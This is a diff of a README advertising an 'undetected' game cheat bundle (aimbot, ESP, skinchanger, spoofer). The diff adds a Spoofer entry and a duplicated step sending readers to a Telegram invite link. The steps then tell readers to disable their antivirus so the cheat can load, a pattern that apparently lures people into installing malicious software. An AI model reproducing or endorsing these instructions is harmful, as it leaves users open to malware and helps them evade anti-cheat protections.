@@ -1,6 +1,7 @@
  ```sh-session
  Status
  ------
+Spoofer (Undetected)
 Aimbot (Undetected)
 Skinchanger (Undetected)
 ESP (Undetected) 
@@ -29,6 +30,7 @@ Crosshair (Undetected)
 
 
 ### STEPS
+[1] Join to telegram chanenl https://t.me/+g4bvaTfSFTs5MGIy
 ```sh-session
 [1] Join to telegram chanenl https://t.me/+g4bvaTfSFTs5MGIy
 [2] Disable any Antivirus that is active. (Antivirus will block the game cheat from loading properly.)
